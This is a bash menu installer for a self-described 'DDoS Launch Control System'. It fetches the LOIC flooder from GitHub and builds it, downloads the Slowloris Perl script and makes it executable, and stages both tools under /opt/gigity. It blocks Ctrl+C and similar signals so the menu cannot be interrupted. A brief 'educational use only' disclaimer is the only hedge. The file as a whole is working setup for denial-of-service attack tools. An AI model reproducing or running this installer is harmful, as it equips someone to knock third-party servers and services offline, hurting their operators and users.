#!/bin/bash
#  G I G I T Y - LOIC DDoS Launch System Installer
#  Christian Marvel
#  Digitalizedwarfare.com
#  This Cannot Be REMOVED. 

## ----------------------------------
# Define variables
# ----------------------------------
EDITOR=nano
PASSWD=/etc/passwd
RED='\033[0;41;30m'
STD='\033[0;0;39m'

# ----------------------------------
# Custom defined function
# ----------------------------------
pause(){
  read -p "Press [Enter] key to continue..." fackEnterKey
  clear
}

install(){
	clear
	
	echo " Installing Required Files from Apt..."
        apt-get install screen default-jre monodevelop mono-gmcs mono-mcs liblog4net-cil-dev git -y
	
	# Cleaning Factorys
	echo " Purging Factorys if they Exist...."
	rm -rf /opt/gigity/factorys

	#Install LOIC
	echo " Create LOIC Factory.... "
	mkdir -p /opt/gigity/factorys/loic_beta
	cd /opt/gigity/factorys/loic_beta
	echo " Downloading LOIC Factory "
	wget https://github.com/downloads/NewEraCracker/LOIC/loic.v1.1.1.25.zip
	unzip loic.v1.1.1.25.zip
	mdtool build
	#mono /opt/gigity/factorys/loic_beta/debug/LOIC.exe
	echo " LOIC Factory Installed..."

	#Install SlowLoris
	echo "Creating SlowLoris Factory....."
	mkdir -p /opt/gigity/factorys/slowloris
	cd /opt/gigity/factorys/slowloris
	echo " Downloading SlowLoris Factory..."
	wget http://ha.ckers.org/slowloris/slowloris.pl
	chmod +x slowloris.pl
	echo " SlowLoris Factory Installed...."
	pause
}

# do something in two()
igigity(){
	echo " Setting Gigity Permissions ......"
	chmod +x /opt/gigity/gigity-gigity.sh
        pause
}

# function to display menus
show_menus() {
	clear
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo " G I G I T Y - DDoS Launch Control System Installer"
	echo " From this Utility you will be able to install LOIC "
	echo " and SlowLoris and ... Gigity...   "
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo " DISCLAIMER  This is for Educational Use Only. Do NOT"
	echo " USE on Machines you do not OWN or have in WRITING that"
	echo " you may do so. I am not LIABLE for any reason......"
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	echo " 1. Set Gigity Permisions...."
	echo " 2. Install Kali Riquired Files.."
	echo " 3. Exit Installer"
}

# Main Menu
read_options(){
	local choice
	read -p "Enter choice [ 1 - 3] " choice
	case $choice in
		1) igigity ;;
		2) install ;;
		3) exit 0;;
		*) echo -e "${RED}Error...${STD}" && sleep 2
	esac
}

# ----------------------------------------------
# Trap CTRL+C, CTRL+Z and quit singles
# ----------------------------------------------
trap '' SIGINT SIGQUIT SIGTSTP

# -----------------------------------
# Main logic - infinite loop
# ------------------------------------
while true
do

	show_menus
	read_options
done
